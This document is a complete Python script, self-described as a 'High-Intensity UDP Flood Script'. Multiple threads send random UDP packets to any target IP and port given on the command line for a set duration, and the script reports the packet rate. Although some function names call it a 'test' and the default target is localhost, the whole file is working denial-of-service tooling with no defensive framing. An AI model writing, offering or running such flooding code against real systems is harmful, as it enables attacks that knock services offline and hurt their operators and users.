import argparse
import socket
import time
import random
import threading

packet_count = 0
packet_lock = threading.Lock()

def attack_worker(target_ip, target_port, duration, packet_size, stop_event):
    global packet_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(packet_size)
    
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
            with packet_lock:
                packet_count += 1
        except:
            break

def run_test(target_ip, target_port, duration, packet_size, threads_count):
    global packet_count
    print(f"Starting Multi-threaded UDP Flood...")
    print(f"Target: {target_ip}:{target_port} | Threads: {threads_count} | Duration: {duration}s\n")
    
    packet_count = 0
    stop_event = threading.Event()
    threads = []
    
    for _ in range(threads_count):
        t = threading.Thread(target=attack_worker, args=(target_ip, target_port, duration, packet_size, stop_event))
        t.start()
        threads.append(t)
    
    # Monitor and report packets per second
    start_time = time.time()
    last_count = 0
    last_time = start_time
    
    while time.time() - start_time < duration:
        time.sleep(1)
        current_time = time.time()
        elapsed = current_time - last_time
        
        with packet_lock:
            current_count = packet_count
        
        packets_per_sec = (current_count - last_count) / elapsed if elapsed > 0 else 0
        print(f"Packets/sec: {packets_per_sec:.0f} | Total packets: {current_count}")
        
        last_count = current_count
        last_time = current_time
    
    stop_event.set()
    
    for t in threads:
        t.join()
    
    total_time = time.time() - start_time
    with packet_lock:
        final_count = packet_count
    
    avg_packets_per_sec = final_count / total_time if total_time > 0 else 0
    print(f"\nTest complete!")
    print(f"Total packets sent: {final_count}")
    print(f"Average packets/sec: {avg_packets_per_sec:.0f}")
    print(f"Total time: {total_time:.2f}s")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="High-Intensity UDP Flood Script")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IP")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--duration", type=int, default=15, help="Duration (sec)")
    parser.add_argument("--size", type=int, default=1024, help="Packet size")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads")
    
    args = parser.parse_args()
    run_test(args.target, args.port, args.duration, args.size, args.threads)
